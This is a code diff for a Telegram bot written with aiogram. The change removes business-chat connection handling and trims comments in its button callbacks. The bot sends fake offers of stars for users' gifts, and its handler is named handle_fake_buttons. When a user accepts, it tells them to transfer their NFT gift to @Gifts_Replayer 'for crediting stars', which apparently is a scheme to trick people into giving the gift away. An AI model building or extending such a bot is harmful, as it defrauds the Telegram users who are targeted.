@@ -53,8 +53,7 @@ async def handle_offer_command(message: types.Message):
             f"<b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a>."
         )
 
-        # 3. Кнопки. В callback_data передаем действие, слаг и сумму
-        # Формат: "accept:gift_slug:amount" или "decline:gift_slug:amount"
+        # 3. Кнопки
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [
                 InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{gift_slug}:{amount}"),
@@ -82,12 +81,7 @@ async def handle_offer_command(message: types.Message):
 # --- ОБРАБОТКА НАЖАТИЙ НА КНОПКИ ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
-    # Получаем ID бизнес-подключения из колбэка
-    business_connection_id = callback.business_connection_id
-    if not business_connection_id:
-        await callback.answer("Ошибка: нет доступа к бизнес-чату.", show_alert=True)
-        return
-
+    # Убрали обращение к несуществующему callback.business_connection_id
     data_parts = callback.data.split(":")
     action = data_parts[0]
     gift_slug = data_parts[1]
@@ -104,8 +98,6 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
                 f"• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зачисления звёзд."
             )
             
-            # Кнопка "Передать NFT". Ссылка ведет прямо на подарок, 
-            # откуда пользователь сможет его отправить.
             new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text="Передать NFT", url=link)]
             ])
@@ -113,21 +105,20 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
         else:
             # Если нажали "Отклонить"
             new_text = f"❌ Оффер на <b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен."
-            new_keyboard = None # Убираем кнопки
+            new_keyboard = None
 
-        # Редактируем исходное сообщение
+        # Редактируем исходное сообщение (без business_connection_id)
         await bot.edit_message_text(
             text=new_text,
             chat_id=callback.message.chat.id,
             message_id=callback.message.message_id,
-            business_connection_id=business_connection_id,
             reply_markup=new_keyboard,
             parse_mode="HTML",
-            link_preview_options=LinkPreviewOptions(is_disabled=True) # Отключаем превью для нового текста
+            link_preview_options=LinkPreviewOptions(is_disabled=True)
         )
         await callback.answer() # Убираем "часики" на кнопке
 
-    except TelegramBadRequest as e:
+    except TelegramBadRequest:
         # Если пользователь нажал дважды или сообщение уже изменено
         await callback.answer("Сообщение уже обработано.", show_alert=True)
     except Exception as e:
